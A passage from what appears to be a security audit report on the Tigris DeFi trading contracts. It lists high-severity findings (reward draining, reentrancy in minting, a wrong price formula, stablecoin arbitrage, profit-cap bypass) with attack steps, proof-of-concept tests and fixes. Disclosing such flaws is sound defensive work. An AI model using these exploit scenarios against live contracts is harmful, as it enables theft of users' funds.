   });
+
   describe(""Withdrawing"", function () {
     it(""Only expired bonds can be withdrawn"", async function () {
       await stabletoken.connect(owner).mintFor(owner.address, ethers.utils.parseEther(""100""));
```

Output:

```
  Bonds
    Rewards
claim count: 41
remain: 7900.000000000000000002
pending3: 8055.7342616570405578

      ✓ Drain BondNFT rewards

  1 passing (4s)

```

### Tools Used

VS Code

### Recommended Mitigation Steps

I recommend that an expired bond should be forced to `release()`, `claim()` an expired bond should revert.

Sample code:

```solidity

diff --git a/contracts/BondNFT.sol b/contracts/BondNFT.sol
index 33a6e76..77e85ae 100644
--- a/contracts/BondNFT.sol
+++ b/contracts/BondNFT.sol
@@ -148,7 +148,7 @@ contract BondNFT is ERC721Enumerable, Ownable {
         amount = bond.amount;
         unchecked {
             totalShares[bond.asset] -= bond.shares;
-            (uint256 _claimAmount,) = claim(_id, bond.owner);
+            (uint256 _claimAmount,) = _claim(_id, bond.owner);
             amount += _claimAmount;
         }
         asset = bond.asset;
@@ -157,8 +157,9 @@ contract BondNFT is ERC721Enumerable, Ownable {
         _burn(_id);
         emit Release(asset, lockAmount, _owner, _id);
     }
+
     /**
-     * @notice Claim rewards from a bond
+     * @notice Claim rewards from an unexpired bond
      * @dev Should only be called by a manager contract
      * @param _id ID of the bond to claim rewards from
      * @param _claimer address claiming rewards
@@ -168,6 +169,22 @@ contract BondNFT is ERC721Enumerable, Ownable {
     function claim(
         uint _id,
         address _claimer
+    ) public onlyManager() returns(uint amount, address tigAsset) {
+        Bond memory bond = idToBond(_id);
+        require(!bond.expired, ""expired"");
+        return _claim(_id, _claimer);
+    }
+
+    /**
+     * @notice Claim rewards from a releasing bond or an unexpired bond
+     * @param _id ID of the bond to claim rewards from
+     * @param _claimer address claiming rewards
+     * @return amount amount of tigAsset claimed
+     * @return tigAsset tigAsset token address
+     */
+    function _claim(
+        uint _id,
+        address _claimer
     ) public onlyManager() returns(uint amount, address tigAsset) {
         Bond memory bond = idToBond(_id);
         require(_claimer == bond.owner, ""!owner"");
```


 




***"
192.md,Incorrect calculation of new price while adding position,high,"*Submitted by [KingNFT](https://github.com/code-423n4/2022-12-tigris-findings/issues/236)*

The formula used for calculating `_newPrice` in `addToPosition()` function of Trading.sol is not correct, users will lose part of their funds/profit while using this function.

The wrong formula

    uint _newPrice = _trade.price*_trade.margin/_newMargin + _price*_addMargin/_newMargin;

The correct formula is

    uint _newPrice = _trade.price * _price * _newMargin /  (_trade.margin * _price + _addMargin * _trade.price);

Why this works?

Given

    P1 = _trade.price
    P2 = _price
    P = _newPrice
    M1 = _trade.margin
    M2 = _addMargin
    M =  M1 + M2 = _newMargin
    L = _trade.leverage
    U1 = M1 * L  = old position in USD
    U2 = M2 * L = new position in USD
    U = U1 + U2 = total position in USD
    E1 = U1 / P1 = old position of base asset, such as ETH, of the pair
    E2 = U2 / P2 = new position of base asset of the pair
    E = E1 + E2 = total position of base asset of the pair

Then

    P = U / E
      = (U1 + U2) / (E1 + E2)
      = (M1 * L + M2 * L) / (U1 / P1 + U2 / P2)
      = P1 * P2 * (M1 * L + M2 * L) / (U1 * P2 + U2 * P1)
      = P1 * P2 * (M1 + M2) * L / (M1 * L * P2 + M2 * L * P1)
      = P1 * P2 * (M1 + M2) * L / [(M1 * P2 + M2 * P1) * L]
      = P1 * P2 * M / (M1 * P2 + M2 * P1)

proven.

### Proof of Concept

The following test case shows two examples that users lose some funds due to adding a new position whenever their existing position is in profit or loss state.

```
const { expect } = require(""chai"");
const { deployments, ethers, waffle } = require(""hardhat"");
const { parseEther, formatEther } = ethers.utils;
const { signERC2612Permit } = require('eth-permit');
const exp = require(""constants"");

describe(""Incorrect calculation of new margin price while adding position"", function () {
  let owner;
  let node;
  let user;
  let node2;
  let node3;
  let proxy;

  let Trading;
  let trading;

  let TradingExtension;
  let tradingExtension;

  let TradingLibrary;
  let tradinglibrary;

  let StableToken;
  let stabletoken;

  let StableVault;
  let stablevault;

  let position;

  let pairscontract;
  let referrals;

  let permitSig;
  let permitSigUsdc;

  let MockDAI;
  let mockdai;
  let MockUSDC;
  let mockusdc;

  let badstablevault;

  let chainlink;

  beforeEach(async function () {
    await deployments.fixture(['test']);
    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();
    StableToken = await deployments.get(""StableToken"");
    stabletoken = await ethers.getContractAt(""StableToken"", StableToken.address);
    Trading = await deployments.get(""Trading"");
    trading = await ethers.getContractAt(""Trading"", Trading.address);
    await trading.connect(owner).setMaxWinPercent(5e10);
    TradingExtension = await deployments.get(""TradingExtension"");
    tradingExtension = await ethers.getContractAt(""TradingExtension"", TradingExtension.address);
    const Position = await deployments.get(""Position"");
    position = await ethers.getContractAt(""Position"", Position.address);
    MockDAI = await deployments.get(""MockDAI"");
    mockdai = await ethers.getContractAt(""MockERC20"", MockDAI.address);
    MockUSDC = await deployments.get(""MockUSDC"");
    mockusdc = await ethers.getContractAt(""MockERC20"", MockUSDC.address);
    const PairsContract = await deployments.get(""PairsContract"");
    pairscontract = await ethers.getContractAt(""PairsContract"", PairsContract.address);
    const Referrals = await deployments.get(""Referrals"");
    referrals = await ethers.getContractAt(""Referrals"", Referrals.address);
    StableVault = await deployments.get(""StableVault"");
    stablevault = await ethers.getContractAt(""StableVault"", StableVault.address);
    await stablevault.connect(owner).listToken(MockDAI.address);
    await stablevault.connect(owner).listToken(MockUSDC.address);
    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);
    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(""1""));
    await tradingExtension.connect(owner).setNode(node.address, true);
    await tradingExtension.connect(owner).setNode(node2.address, true);
    await tradingExtension.connect(owner).setNode(node3.address, true);
    await network.provider.send(""evm_setNextBlockTimestamp"", [2000000000]);
    await network.provider.send(""evm_mine"");
    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);
    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);

    const BadStableVault = await ethers.getContractFactory(""BadStableVault"");
    badstablevault = await BadStableVault.deploy(StableToken.address);

    const ChainlinkContract = await ethers.getContractFactory(""MockChainlinkFeed"");
    chainlink = await ChainlinkContract.deploy();

    TradingLibrary = await deployments.get(""TradingLibrary"");
    tradinglibrary = await ethers.getContractAt(""TradingLibrary"", TradingLibrary.address);
    await trading.connect(owner).setLimitOrderPriceRange(1e10);
  });


  describe(""Initial margin $500, leverage 2x, position $1000, price $1000"", function () {
    let orderId;
    let initPrice = parseEther(""1000"");
    beforeEach(async function () {
      // To simpliy the problem, set fees to 0
      await trading.setFees(true, 0, 0, 0, 0, 0);
      await trading.setFees(false, 0, 0, 0, 0, 0);

      let TradeInfo = [parseEther(""500""), MockDAI.address, StableVault.address, parseEther(""2""), 1, true, parseEther(""0""), parseEther(""0""), ethers.constants.HashZero];
      let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];
      let message = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, initPrice, 0, 2000000000, false]
        )
      );
      let sig = await node.signMessage(
        Buffer.from(message.substring(2), 'hex')
      );
      
      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];
      orderId = await position.getCount();
      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);
      expect(await position.assetOpenPositionsLength(1)).to.equal(1);
      let trade = await position.trades(orderId);
      let marginAfterFee = trade.margin;
      expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);
      expect(trade.price.eq(parseEther('1000'))).to.be.true;
      expect(trade.leverage.eq(parseEther('2'))).to.be.true;
    });

    it.only(""Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666"", async function () {
      // The price increases from $1000 to $2000, the old position earns $1000 profit.
      // The expected PnL payout = old margin + earned profit + new margin
      //                         = $500 + $1000 + $500
      //                         = $2000
      let addingPrice = parseEther('2000');
      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];
      let addingMessage = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, addingPrice, 0, 2000000000, false]
        )
      );
      let addingSig = await node.signMessage(
        Buffer.from(addingMessage.substring(2), 'hex')
      );

      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];
      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);

      let trade = await position.trades(orderId);
      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,
        trade.margin, trade.leverage, trade.accInterest);
      expect(pnl._payout.gt(parseEther('1666'))).to.be.true;
      expect(pnl._payout.lt(parseEther('1667'))).to.be.true;
    });

    it.only(""Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714"", async function () {
      // The price decreases from $1000 to $750, the old position losses $250.
      // The expected PnL payout = old margin - loss + new margin
      //                         = $500 - $250 + $500
      //                         = $750
      let addingPrice = parseEther('750');
      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];
      let addingMessage = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, addingPrice, 0, 2000000000, false]
        )
      );
      let addingSig = await node.signMessage(
        Buffer.from(addingMessage.substring(2), 'hex')
      );

      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];
      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);

      let trade = await position.trades(orderId);
      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,
        trade.margin, trade.leverage, trade.accInterest);
      expect(pnl._payout.gt(parseEther('714'))).to.be.true;
      expect(pnl._payout.lt(parseEther('715'))).to.be.true;
    });

  });
});

```

The test result

    Incorrect calculation of new margin price while adding position
        Initial margin $500, leverage 2x, position $1000, price $1000
          √ Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1666
          √ Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $714

### Tools Used

Hardhat

### Recommended Mitigation Steps

Use the correct formula, the following test case is for the same above examples after fix.

```
const { expect } = require(""chai"");
const { deployments, ethers, waffle } = require(""hardhat"");
const { parseEther, formatEther } = ethers.utils;
const { signERC2612Permit } = require('eth-permit');
const exp = require(""constants"");

describe(""Correct calculation of new margin price while adding position"", function () {
  let owner;
  let node;
  let user;
  let node2;
  let node3;
  let proxy;

  let Trading;
  let trading;

  let TradingExtension;
  let tradingExtension;

  let TradingLibrary;
  let tradinglibrary;

  let StableToken;
  let stabletoken;

  let StableVault;
  let stablevault;

  let position;

  let pairscontract;
  let referrals;

  let permitSig;
  let permitSigUsdc;

  let MockDAI;
  let mockdai;
  let MockUSDC;
  let mockusdc;

  let badstablevault;

  let chainlink;

  beforeEach(async function () {
    await deployments.fixture(['test']);
    [owner, node, user, node2, node3, proxy] = await ethers.getSigners();
    StableToken = await deployments.get(""StableToken"");
    stabletoken = await ethers.getContractAt(""StableToken"", StableToken.address);
    Trading = await deployments.get(""Trading"");
    trading = await ethers.getContractAt(""Trading"", Trading.address);
    await trading.connect(owner).setMaxWinPercent(5e10);
    TradingExtension = await deployments.get(""TradingExtension"");
    tradingExtension = await ethers.getContractAt(""TradingExtension"", TradingExtension.address);
    const Position = await deployments.get(""Position"");
    position = await ethers.getContractAt(""Position"", Position.address);
    MockDAI = await deployments.get(""MockDAI"");
    mockdai = await ethers.getContractAt(""MockERC20"", MockDAI.address);
    MockUSDC = await deployments.get(""MockUSDC"");
    mockusdc = await ethers.getContractAt(""MockERC20"", MockUSDC.address);
    const PairsContract = await deployments.get(""PairsContract"");
    pairscontract = await ethers.getContractAt(""PairsContract"", PairsContract.address);
    const Referrals = await deployments.get(""Referrals"");
    referrals = await ethers.getContractAt(""Referrals"", Referrals.address);
    StableVault = await deployments.get(""StableVault"");
    stablevault = await ethers.getContractAt(""StableVault"", StableVault.address);
    await stablevault.connect(owner).listToken(MockDAI.address);
    await stablevault.connect(owner).listToken(MockUSDC.address);
    await tradingExtension.connect(owner).setAllowedMargin(StableToken.address, true);
    await tradingExtension.connect(owner).setMinPositionSize(StableToken.address, parseEther(""1""));
    await tradingExtension.connect(owner).setNode(node.address, true);
    await tradingExtension.connect(owner).setNode(node2.address, true);
    await tradingExtension.connect(owner).setNode(node3.address, true);
    await network.provider.send(""evm_setNextBlockTimestamp"", [2000000000]);
    await network.provider.send(""evm_mine"");
    permitSig = await signERC2612Permit(owner, MockDAI.address, owner.address, Trading.address, ethers.constants.MaxUint256);
    permitSigUsdc = await signERC2612Permit(owner, MockUSDC.address, owner.address, Trading.address, ethers.constants.MaxUint256);

    const BadStableVault = await ethers.getContractFactory(""BadStableVault"");
    badstablevault = await BadStableVault.deploy(StableToken.address);

    const ChainlinkContract = await ethers.getContractFactory(""MockChainlinkFeed"");
    chainlink = await ChainlinkContract.deploy();

    TradingLibrary = await deployments.get(""TradingLibrary"");
    tradinglibrary = await ethers.getContractAt(""TradingLibrary"", TradingLibrary.address);
    await trading.connect(owner).setLimitOrderPriceRange(1e10);
  });


  describe(""Initial margin $500, leverage 2x, position $1000, price $1000"", function () {
    let orderId;
    let initPrice = parseEther(""1000"");
    beforeEach(async function () {
      // To simpliy the problem, set fees to 0
      await trading.setFees(true, 0, 0, 0, 0, 0);
      await trading.setFees(false, 0, 0, 0, 0, 0);

      let TradeInfo = [parseEther(""500""), MockDAI.address, StableVault.address, parseEther(""2""), 1, true, parseEther(""0""), parseEther(""0""), ethers.constants.HashZero];
      let PriceData = [node.address, 1, initPrice, 0, 2000000000, false];
      let message = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, initPrice, 0, 2000000000, false]
        )
      );
      let sig = await node.signMessage(
        Buffer.from(message.substring(2), 'hex')
      );
      
      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, true];
      orderId = await position.getCount();
      await trading.connect(owner).initiateMarketOrder(TradeInfo, PriceData, sig, PermitData, owner.address);
      expect(await position.assetOpenPositionsLength(1)).to.equal(1);
      let trade = await position.trades(orderId);
      let marginAfterFee = trade.margin;
      expect(marginAfterFee.eq(parseEther('500'))).to.equal(true);
      expect(trade.price.eq(parseEther('1000'))).to.be.true;
      expect(trade.leverage.eq(parseEther('2'))).to.be.true;
    });

    it.only(""Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999"", async function () {
      // The price increases from $1000 to $2000, the old position earns $1000 profit.
      // The expected PnL payout = old margin + earned profit + new margin
      //                         = $500 + $1000 + $500
      //                         = $2000
      let addingPrice = parseEther('2000');
      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];
      let addingMessage = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, addingPrice, 0, 2000000000, false]
        )
      );
      let addingSig = await node.signMessage(
        Buffer.from(addingMessage.substring(2), 'hex')
      );

      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];
      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);

      let trade = await position.trades(orderId);
      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,
        trade.margin, trade.leverage, trade.accInterest);
      expect(pnl._payout.gt(parseEther('1999.99999'))).to.be.true;
      expect(pnl._payout.lt(parseEther('2000'))).to.be.true;
    });

    it.only(""Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999"", async function () {
      // The price decreases from $1000 to $750, the old position losses $250.
      // The expected PnL payout = old margin - loss + new margin
      //                         = $500 - $250 + $500
      //                         = $750
      let addingPrice = parseEther('750');
      let addingPriceData = [node.address, 1, addingPrice, 0, 2000000000, false];
      let addingMessage = ethers.utils.keccak256(
        ethers.utils.defaultAbiCoder.encode(
          ['address', 'uint256', 'uint256', 'uint256', 'uint256', 'bool'],
          [node.address, 1, addingPrice, 0, 2000000000, false]
        )
      );
      let addingSig = await node.signMessage(
        Buffer.from(addingMessage.substring(2), 'hex')
      );

      let PermitData = [permitSig.deadline, ethers.constants.MaxUint256, permitSig.v, permitSig.r, permitSig.s, false];
      await trading.connect(owner).addToPosition(orderId, parseEther('500'), addingPriceData, addingSig, StableVault.address, MockDAI.address, PermitData, owner.address);

      let trade = await position.trades(orderId);
      let pnl = await tradinglibrary.pnl(trade.direction, addingPrice, trade.price,
        trade.margin, trade.leverage, trade.accInterest);
      expect(pnl._payout.gt(parseEther('749.99999'))).to.be.true;
      expect(pnl._payout.lt(parseEther('750'))).to.be.true;
    });

  });
});

```

The test result

    Correct calculation of new margin price while adding position
        Initial margin $500, leverage 2x, position $1000, price $1000
          √ Add position with new price $2000 and new margin $500, expected PnL payout $2000, actual payout $1999.99999
          √ Add position with new price $750 and new margin $500, expected PnL payout $750, actual payout $749.99999







***"
192.md,reentrancy attack during `mint()` function in Position contract which can lead to removing of the other user's limit orders or stealing contract funds because initId is set low value,high,"*Submitted by [unforgiven](https://github.com/code-423n4/2022-12-tigris-findings/issues/400), also found by [wait](https://github.com/code-423n4/2022-12-tigris-findings/issues/539), [rotcivegaf](https://github.com/code-423n4/2022-12-tigris-findings/issues/489), [0xsomeone](https://github.com/code-423n4/2022-12-tigris-findings/issues/459), [hihen](https://github.com/code-423n4/2022-12-tigris-findings/issues/451), [KingNFT](https://github.com/code-423n4/2022-12-tigris-findings/issues/357), [mookimgo](https://github.com/code-423n4/2022-12-tigris-findings/issues/288), [debo](https://github.com/code-423n4/2022-12-tigris-findings/issues/186), and [stealthyz](https://github.com/code-423n4/2022-12-tigris-findings/issues/90)*

Function `Position.mint()` has been used in `initiateLimitOrder()` and `initiateMarketOrder()` and it doesn't follow check-effect-interaction pattern and code updates the values of `_limitOrders`, `initId`, `_openPositions` and `position _tokenIds` variables after making external call by using `safeMint()`. This would give the attacker opportunity to reenter the Trading contract logics and perform malicious actions while the contract storage state is wrong. The only limitation of the attacker is that he needs to bypass `_checkDelay()` checks. Attacker can perform this action:

1.  Call `initiateLimitOrder()` and create limit order with id equal to ID1 reenter (while `_limitOrders` for ID1 is not yet settled) with `cancelLimitOrder(ID1)` (no `checkDelay()` check) and remove other users limit orders because code would try to remove `_limitOrderIndexes[_asset][ID1]` position but the value is 0 and code would remove limit order in the index 0 which belongs to another user in the `Position.burn()` code.
2.  Call `initiateMarketOrder()` and create a position with ID1 and while `initId[ID1]` has not yet settled reenter the Trading with `addToPosition(ID1)` function (bypass `checkDelay()` because both action is opening) and increase the position size which would set `initId[ID1]` according to new position values but then when code execution returns to rest of `mint()` logic `initId[ID1]` would set by initial values of the positions which is very lower than what it should be and `initId[ID1]` has been used for calculating `accuredInterest` of the position which is calculated for profit and loss of position and contract would calculate more profit for position and would pay attacker more profit from contract balances.

### Proof of Concept

This is `mint()` code in Position contract:

        function mint(
            MintTrade memory _mintTrade
        ) external onlyMinter {
            uint newTokenID = _tokenIds.current();

            Trade storage newTrade = _trades[newTokenID];
            newTrade.margin = _mintTrade.margin;
            newTrade.leverage = _mintTrade.leverage;
            newTrade.asset = _mintTrade.asset;
            newTrade.direction = _mintTrade.direction;
            newTrade.price = _mintTrade.price;
            newTrade.tpPrice = _mintTrade.tp;
            newTrade.slPrice = _mintTrade.sl;
            newTrade.orderType = _mintTrade.orderType;
            newTrade.id = newTokenID;
            newTrade.tigAsset = _mintTrade.tigAsset;

            _safeMint(_mintTrade.account, newTokenID);   // make external call because of safeMint() usage
            if (_mintTrade.orderType > 0) { // update the values of some storage functions
                _limitOrders[_mintTrade.asset].push(newTokenID);
                _limitOrderIndexes[_mintTrade.asset][newTokenID] = _limitOrders[_mintTrade.asset].length-1;
            } else {
                initId[newTokenID] = accInterestPerOi[_mintTrade.asset][_mintTrade.tigAsset][_mintTrade.direction]*int256(_mintTrade.margin*_mintTrade.leverage/1e18)/1e18;
                _openPositions.push(newTokenID);
                _openPositionsIndexes[newTokenID] = _openPositions.length-1;

                _assetOpenPositions[_mintTrade.asset].push(newTokenID);
                _assetOpenPositionsIndexes[_mintTrade.asset][newTokenID] = _assetOpenPositions[_mintTrade.asset].length-1;
            }
            _tokenIds.increment();
        }

As you can see by calling `_safeMint()`, code would make external call to `onERC721Received()` function of the account address and the code sets the values for `_limitOrders[]`, `_limitOrderIndexes[]`, `initId[]`, `_openPositions[]`, `_openPositionsIndexes[]`, `_assetOpenPositions[]`, `_assetOpenPositionsIndexes[]` and `_tokenIds`. So code doesn't follow check-effect-interaction pattern and it's possible to perform reentrancy attack.

There could be multiple scenarios that the attacker can perform the attack and do some damage. Two of them are:

**Scenario #1 where attacker removes other users limit orders and create broken storage state**

1.  Attacker contract would call `initiateLimitOrder()` and code would create the limit order and mint it in the `Position._safeMint()` with ID1.
2.  Then code would call attacker address in `_safeMint()` function because of the `onERC721Received()` call check.
3.  Variables `_limitOrders[]`, `_limitOrderIndexes[ID1]` are not yet updated for ID1 and `_limitOrderIndexes[ID1]` is 0x0 and ID1 is not in `_limitOrder[]` list.
4.  Attacker contract would reenter the Trading contract by calling `cancelLimitOrder(ID1)`.
5.  `cancelLimitOrder()` checks would pass and would try to call `Position.burn(ID1)`.
6.  `burn()` function would try to remove ID1 from `_limitOrders[]` list but because `_limitOrderIndexes[ID1]` is 0, the code would remove the 0 index limit order which belongs to another user.
7.  Execution would return to `Position.mint()` logic and code would add burned id token to `_limitOrder[]` list.

So there are two impacts here.  First, other users limit orders get removed.  The second is that contract storage had a bad state and burned tokens get stock in the list.

**Scenario #2 where attacker steal contract/users funds by wrong profit calculation**

1.  Attacker's contract would call `initiateMarketOrder(lowMargin)` to create position with ID1 while the margin is low.
2.  Code would mint position token for attacker and in `_safeMint()` would make external call and call `onERC721Received()` function of attacker address.
3.  The value of `initId[ID1]` is not yet set for ID1.
4.  Attacker contract would call `addToPosition(ID1, bigMargin)` to increase the margin of the position the `_checkDelay()` check would pass because both actions are opening position.
5.  Code would increase the margin of the position and set the value of the `initId[ID1]` by calling `position.addToPosition()` and the value would be based on the `newMargin`.
6.  The execution flow would receive the rest of `Position.mint()` function and code would set `initId[ID1]` based on old margin value.
7.  Then the value of `initId[ID1]` for attacker position would be very low, which would cause `accInterest` to be higher than it's supposed to be for position(in `Position.trades()` function calculations ) and would cause `_payout` value to be very high (in `pnl()` function's calculations) and when attacker close position ID1 attacker would receive a lot more profit from it.

So attacker created a position with a lot of profit by reentering the logics and manipulating calculation of the profits for the position.

There can be other scenarios possible to perform and damage the protocol or users because there is no reentrancy protection mechanism and attacker only need to bypass validity checks of functions.

### Tools Used

VIM

### Recommended Mitigation Steps

Follow the check-effect-interaction pattern.







***"
192.md,Incorrect Assumption of Stablecoin Market Stability,high,"*Submitted by [0xsomeone](https://github.com/code-423n4/2022-12-tigris-findings/issues/462), also found by [Critical](https://github.com/code-423n4/2022-12-tigris-findings/issues/496), [\_\_141345\_\_](https://github.com/code-423n4/2022-12-tigris-findings/issues/397), [Tointer](https://github.com/code-423n4/2022-12-tigris-findings/issues/384), [Secureverse](https://github.com/code-423n4/2022-12-tigris-findings/issues/243), [SamGMK](https://github.com/code-423n4/2022-12-tigris-findings/issues/227), [rotcivegaf](https://github.com/code-423n4/2022-12-tigris-findings/issues/214), [0xhacksmithh](https://github.com/code-423n4/2022-12-tigris-findings/issues/210), [8olidity](https://github.com/code-423n4/2022-12-tigris-findings/issues/203), [Ruhum](https://github.com/code-423n4/2022-12-tigris-findings/issues/155), and [aviggiano](https://github.com/code-423n4/2022-12-tigris-findings/issues/151)*

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L39-L51> 

<https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L60-L72>

### Impact

The `StableVault` contract attempts to group all types of stablecoins under a single token which can be minted for any of the stablecoins supported by the system as well as burned for any of them.

This is at minimum a medium-severity vulnerability as the balance sheet of the `StableVault` will consist of multiple assets which do not have a one-to-one exchange ratio between them as can be observed by trading pools such as [Curve](https://curve.fi/#/ethereum/pools/3pool/deposit) as well as the [Chainlink oracle reported prices themselves](https://data.chain.link/ethereum/mainnet/stablecoins/usdc-usd).

Given that the contract exposes a 0% slippage 1-to-1 exchange between assets that in reality have varying prices, the balance sheet of the contract can be arbitraged (especially by flash-loans) to swap an undesirable asset (i.e. USDC which at the time of submission was valued at `0.99994853` USD) for a more desirable asset (i.e. USDT which at the time of submission was valued at `1.00000000` USD) acquiring an arbitrage in the price by selling the traded asset.

### Proof of Concept

To illustrate the issue, simply view the exchange output you would get for swapping your USDC to USDT in a stablecoin pool (i.e. CurveFi) and then proceed to [invoke `deposit`](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L39-L51) with your USDC asset and retrieve your [incorrectly calculated `USDT` equivalent via `withdraw`](https://github.com/code-423n4/2022-12-tigris/blob/main/contracts/StableVault.sol#L60-L72).

The arbitrage can be observed by assessing the difference in the trade outputs and can be capitalized by selling our newly acquired `USDT` for `USDC` on the stablecoin pair we assessed earlier, ultimately ending up with a greater amount of `USDC` than we started with. This type of attack can be extrapolated by utilizing a flash-loan rather than our personal funds.

### Tools Used

[Chainlink oracle resources](https://data.chain.link/popular)

[Curve Finance pools](https://curve.fi/#/ethereum/pools)

### Recommended Mitigation Steps

We advise the `StableVault` to utilize Chainlink oracles for evaluating the inflow of assets instead, ensuring that all inflows and outflows of stablecoins are fairly evaluated based on their ""neutral"" USD price rather than their subjective on-chain price or equality assumption.




***"
192.md,Users can bypass the `maxWinPercent` limit using a partially closing,high,"*Submitted by [hansfriese](https://github.com/code-423n4/2022-12-tigris-findings/issues/507), also found by [0x52](https://github.com/code-423n4/2022-12-tigris-findings/issues/487), [0xA5DF](https://github.com/code-423n4/2022-12-tigris-findings/issues/339), and [bin2chen](https://github.com/code-423n4/2022-12-tigris-findings/issues/332)*

Users can bypass the `maxWinPercent` limit using a partial closing.

As a result, users can receive more funds than their upper limit from the protocol.

### Proof of Concept

As we can see from the [documentation](https://docs.tigris.trade/protocol/trading-and-fees#limitations), there is limitation of a maximum PnL.

    Maximum PnL is +500%. The trade won't be closed unless the user sets a Take Profit order or closes the position manually.

And this logic was implemented like below in `_closePosition()`.

```solidity
File: 2022-12-tigris\contracts\Trading.sol
624:                 _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);
625:                 if (maxWinPercent > 0 && _toMint > _trade.margin*maxWinPercent/DIVISION_CONSTANT) { //@audit bypass limit
626:                     _toMint = _trade.margin*maxWinPercent/DIVISION_CONSTANT;
627:                 }
```

But it checks the `maxWinPercent` between the partial payout and full margin so the below scenario is possible.

1.  Alice opened an order of margin = 100 and PnL = 1000 after taking closing fees.
2.  If `maxWinPercent` = 500%, Alice should receive 500 at most.
3.  But Alice closed 50% of the position and she got 500 for a 50% margin because it checks `maxWinPercent` with `_toMint = 500` and `_trade.margin = 100`
4.  After she closed 50% of the position, the remaining margin = 50 and PnL = 500 so she can continue step 3 again and again.
5.  As a result, she can withdraw almost 100% of the initial PnL(1000) even though she should receive at most 500.

### Recommended Mitigation Steps

We should check the `maxWinPercent` between the partial payout and partial margin like below.

```solidity
    _toMint = _handleCloseFees(_trade.asset, uint256(_payout)*_percent/DIVISION_CONSTANT, _trade.tigAsset, _positionSize*_percent/DIVISION_CONSTANT, _trade.trader, _isBot);

    uint256 partialMarginToClose = _trade.margin * _percent / DIVISION_CONSTANT; //+++++++++++++++++++++++
    if (maxWinPercent > 0 && _toMint > partialMarginToClose*maxWinPercent/DIVISION_CONSTANT) { 
        _toMint = partialMarginToClose*maxWinPercent/DIVISION_CONSTANT;
    }
```






***"
192.md,User can abuse tight stop losses and high leverage to make risk free trades,high,"*Submitted by [0x52](https://github.com/code-423n4/2022-12-tigris-findings/issues/622), also found by [hansfriese](https://github.com/code-423n4/2022-12-tigris-findings/issues/515) and [noot](https://github.com/code-423n4/2022-12-tigris-findings/issues/48)*

User can abuse how stop losses are priced to open high leverage trades with huge upside and very little downside.

### Proof of Concept

    function limitClose(
        uint _id,
        bool _tp,
        PriceData calldata _priceData,
        bytes calldata _signature
    )
        external
    {
        _checkDelay(_id, false);
        (uint _limitPrice, address _tigAsset) = tradingExtension._limitClose(_id, _tp, _priceData, _signature);
        _closePosition(_id, DIVISION_CONSTANT, _limitPrice, address(0), _tigAsset, true);
    }

    function _limitClose(
        uint _id,
        bool _tp,
        PriceData calldata _priceData,
        bytes calldata _signature
    ) external view returns(uint _limitPrice, address _tigAsset) {
        _checkGas();

        IPosition.Trade memory _trade = position.trades(_id);
        _tigAsset = _trade.tigAsset;
        getVerifiedPrice(_trade.asset, _priceData, _signature, 0);
        uint256 _price = _priceData.price;
        if (_trade.orderType != 0) revert(""4""); //IsLimit
        if (_tp) {
            if (_trade.tpPrice == 0) revert(""7""); //LimitNotSet
            if (_trade.direction) {
                if (_trade.tpPrice > _price) revert(""6""); //LimitNotMet
            } else {
                if (_trade.tpPrice < _price) revert(""6""); //LimitNotMet
            }
            _limitPrice = _trade.tpPrice;
        } else {
            if (_trade.slPrice == 0) revert(""7""); //LimitNotSet
